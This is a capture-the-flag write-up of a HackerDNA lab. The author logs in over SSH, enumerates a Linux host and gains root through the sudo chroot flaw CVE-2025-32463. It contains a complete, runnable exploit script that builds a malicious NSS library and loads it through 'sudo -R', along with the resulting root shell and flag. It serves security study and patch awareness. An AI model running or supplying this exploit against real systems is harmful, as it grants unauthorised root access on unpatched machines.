# TechNova Infiltration – Privilege Escalation Writeup




{{< admonition tldr "TL;DR" >}}

**TechNova Infiltration – Privilege Escalation Writeup** is a misc challenge from **HackerDNA**. In this lab we were tasked with infiltrating the **TechNova infrastructure** and escalating privileges to obtain the **root flag**.

{{< /admonition >}}

## Overview

In this lab we were tasked with infiltrating the **TechNova infrastructure** and escalating privileges to obtain the **root flag**.

The challenge provided an SSH private key which allowed initial access to the target machine as a low-privileged user.

Target environment:

* OS: Ubuntu 24.04.3 LTS
* Kernel: 6.1.161
* Architecture: arch64
* Initial user: `devuser` The goal was to escalate privileges and retrieve the root flag.

---

# Initial Access

The challenge provided an SSH private key ( `id_rsa` ) that allowed us to connect to the target machine.

```bash
ssh -i id_rsa devuser@3.255.146.124
```

After entering the passphrase, we obtained a shell as the **devuser**.

```
Welcome to Ubuntu 24.04.3 LTS
devuser@ip-10-0-9-106:~$
```

Listing the home directory revealed the user flag:

```bash
ls
```

```
flag-user.txt
```

---

# Enumeration

After gaining access, we began enumerating the system to identify possible privilege escalation vectors.

## Process Enumeration

Running the following command:

```bash
ps aux
```

showed several services running as root:

```
root 1 /usr/bin/python3 /usr/bin/supervisord
root 7 nginx
root 8 sshd
```

This indicated the system was managed by **supervisord**, which is commonly used for service orchestration.

---

## Environment Path

We checked the execution path:

```bash
echo $PATH
```

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

No writable directories were present in the path, eliminating **PATH hijacking**.

---

## Writable File Search

Next, we searched for writable files:

```bash
find / -writable -type f 2>/dev/null
```

The results only included files within the user’s home directory and `/proc` .

Therefore, no obvious **misconfigured writable scripts** were discovered.

---

## Sudo Version Check

We inspected the installed sudo version:

```bash
sudo --version
```

Output:

```
Sudo version 1.9.16p2
```

This version appeared relatively recent, but further research revealed a **new privilege escalation vulnerability** affecting this version.

---

# Privilege Escalation

## CVE-2025-32463 – Sudo Privilege Escalation

The installed sudo version was vulnerable to **CVE-2025-32463**, a privilege escalation vulnerability discovered by **Stratascale Cyber Research Unit (CRU)**.

This vulnerability allows a local user to escalate privileges to root by abusing the ** `sudo -R` option combined with a malicious NSS module**.

The attack works by:

1. Creating a fake root directory structure
2. Injecting a malicious NSS shared library
3. Executing `sudo -R` to load the attacker-controlled library
4. Triggering code execution as root

---

## Exploit Implementation

We created the following exploit script:

```bash
#!/bin/bash

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

CMD="/bin/bash"

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD}", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc

gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

sudo -R woot woot
```

The exploit compiles a malicious NSS library and forces sudo to load it.

---

# Root Access

Executing the exploit produced a root shell:

```
root@ip-10-0-9-106:/#
```

We verified root access:

```bash
whoami
```

```
root
```

---

# Root Flag

Finally, we retrieved the root flag:

```bash
cat /root/flag-root.txt
```

```
58702b16-e0ea-445b-8cf6-3ac1641ab576
```

---

# Attack Summary

The full attack chain:

1. Obtain SSH private key
2. Login as `devuser` 3. Enumerate system configuration
4. Identify vulnerable sudo version
5. Exploit **CVE-2025-32463**
6. Gain root shell
7. Retrieve root flag

---

# Key Takeaways

This challenge demonstrates several important security lessons:

* Even **recent software versions** may contain newly discovered vulnerabilities.
* Misconfigured or vulnerable **privilege management tools** like sudo are critical escalation points.
* Proper **patch management** is essential for preventing local privilege escalation attacks.

---

# Conclusion

By exploiting **CVE-2025-32463** in sudo, we successfully escalated privileges from `devuser` to `root` and retrieved the final flag.

This lab highlights the importance of continuous vulnerability monitoring and patching in modern Linux environments.


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/technova-infiltration/  

